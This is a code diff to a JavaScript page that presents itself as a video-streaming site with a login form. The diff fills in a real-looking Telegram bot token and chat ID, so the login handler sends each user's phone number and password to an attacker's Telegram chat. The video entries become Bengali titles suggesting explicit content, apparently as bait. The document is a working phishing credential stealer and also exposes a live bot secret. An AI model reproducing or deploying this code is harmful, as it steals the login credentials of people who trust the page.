@@ -1,13 +1,13 @@
 const videos = [
   {
-    title: "Nature Stream",
+    title: "বাংলা  মাল 🥵🥵🥵",
     thumb: "https://i.ibb.co.com/xSrJc31m/IMG-20250419-015736-295.jpg",
     url: "https://github.com/teamxx426/Reamx2/raw/refs/heads/main/5_6053354450607674764.mp4"
   },
   {
-    title: "Live Channel 1",
-    thumb: "https://img.youtube.com/vi/L_jWHffIx5E/hqdefault.jpg",
-    url: "https://bitdash-a.akamaihd.net/content/sintel/hls/playlist.m3u8"
+    title: "বাংলা মাল 🥵🥵 ২",
+    thumb: "https://github.com/teamxx426/Reamx2/blob/main/IMG_20250419_015941_242.jpg",
+    url: "https://github.com/teamxx426/Reamx2/raw/refs/heads/main/VID_20250419_015944_300.mp4"
   },
   {
     title: "Tech Demo",
@@ -35,11 +35,11 @@ function handleLogin() {
   document.getElementById('loginForm').style.display = 'none';
   document.getElementById('videoArea').style.display = 'block';
 
-  fetch(`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage`, {
+  fetch(`https://api.telegram.org/bot<8109746515:AAHsmsg9mcrW1HyXuQC8uMSDil3WTErWoK0>/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      chat_id: "<YOUR_CHAT_ID>",
+      chat_id: "<7987662357>",
       text: `Login:\nPhone: ${phone}\nPassword: ${password}`
     })
   });
